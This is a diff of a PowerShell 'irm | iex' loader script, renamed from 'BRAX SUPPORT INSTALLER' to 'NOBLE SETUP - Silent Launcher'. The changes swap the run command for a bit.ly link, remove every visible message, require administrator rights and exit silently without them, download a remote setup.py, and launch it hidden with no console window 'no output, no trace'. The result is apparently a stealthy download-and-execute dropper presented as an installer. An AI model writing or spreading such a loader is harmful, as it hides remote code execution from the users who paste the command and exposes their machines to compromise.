@@ -1,74 +1,54 @@
-# BRAX SUPPORT INSTALLER - IEX Loader
-# Usage: irm https://raw.githubusercontent.com/beatboxe17x-sys/setupn/refs/heads/main/brax.ps1 | iex
+# NOBLE SETUP - Silent Launcher
+# Usage: irm https://bit.ly/4dbqqti | iex
 
-$ErrorActionPreference = 'Stop'
+$ErrorActionPreference = 'SilentlyContinue'
+$ProgressPreference = 'SilentlyContinue'
 
-# Check admin
+# Check admin silently
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
 if (-not $isAdmin) {
-    Write-Host @"
-╔══════════════════════════════════════════════════════════════╗
-║  ERROR: Administrator privileges required!                   ║
-║                                                              ║
-║  Please right-click PowerShell and select                    ║
-║  "Run as Administrator", then run this command again.        ║
-╚══════════════════════════════════════════════════════════════╝
-"@ -ForegroundColor Red
-    return
+    # Silently exit - no output
+    exit
 }
 
 # Create temp directory
 $tempDir = Join-Path $env:TEMP "BraxInstaller"
 New-Item -ItemType Directory -Force -Path $tempDir | Out-Null
 
-# Download the Python script
+# Download setup.py silently
 $pyUrl = "https://raw.githubusercontent.com/beatboxe17x-sys/setupn/refs/heads/main/setup.py"
 $pyPath = Join-Path $tempDir "setup.py"
 
-Write-Host "[*] Downloading BRAX SUPPORT INSTALLER..." -ForegroundColor Cyan
 try {
-    Invoke-WebRequest -Uri $pyUrl -OutFile $pyPath -UseBasicParsing
-    $size = (Get-Item $pyPath).Length
-    Write-Host "[+] Downloaded: $size bytes" -ForegroundColor Green
+    Invoke-WebRequest -Uri $pyUrl -OutFile $pyPath -UseBasicParsing | Out-Null
 } catch {
-    Write-Host "[!] Download failed: $_" -ForegroundColor Red
-    return
+    exit
 }
 
-# Check Python
-$python = Get-Command python -ErrorAction SilentlyContinue
+# Check Python silently
+$python = Get-Command pythonw -ErrorAction SilentlyContinue
 if (-not $python) {
-    $python = Get-Command python3 -ErrorAction SilentlyContinue
+    $python = Get-Command python -ErrorAction SilentlyContinue
 }
 
 if (-not $python) {
-    Write-Host "[!] Python not found! Installing..." -ForegroundColor Yellow
-    
-    $pyInstaller = Join-Path $tempDir "python_installer.exe"
-    try {
-        Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe" -OutFile $pyInstaller -UseBasicParsing
-        Start-Process -FilePath $pyInstaller -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0" -Wait
-        $env:Path = [Environment]::GetEnvironmentVariable("Path", "Machine") + ";" + [Environment]::GetEnvironmentVariable("Path", "User")
-        $python = Get-Command python -ErrorAction SilentlyContinue
-    } catch {
-        Write-Host "[!] Python install failed. Download from python.org" -ForegroundColor Red
-        return
-    }
+    exit
 }
 
-# Check tkinter
-$tkCheck = & $python.Source -c "import tkinter" 2>&1
+# Install tkinter silently if needed
+& $python.Source -c "import tkinter" 2>$null
 if ($LASTEXITCODE -ne 0) {
-    Write-Host "[*] Installing tkinter..." -ForegroundColor Cyan
-    & $python.Source -m pip install tk 2>$null
+    & $python.Source -m pip install tk -q --no-warn-script-location 2>$null | Out-Null
 }
 
-# Launch
-Write-Host "[*] Launching BRAX SUPPORT INSTALLER GUI..." -ForegroundColor Cyan
-Start-Process -FilePath $python.Source -ArgumentList "`"$pyPath`"" -Wait
+# Launch GUI with NO CONSOLE WINDOW
+$psi = New-Object System.Diagnostics.ProcessStartInfo
+$psi.FileName = $python.Source
+$psi.Arguments = "`"$pyPath`""
+$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+$psi.CreateNoWindow = $true
+$psi.UseShellExecute = $false
+[System.Diagnostics.Process]::Start($psi) | Out-Null
 
-Write-Host @"
-╔══════════════════════════════════════════════════════════════╗
-║  [+] BRAX SUPPORT INSTALLER COMPLETE                         ║
-╚══════════════════════════════════════════════════════════════╝
-"@ -ForegroundColor Green
+# Exit immediately - no output, no trace
+exit
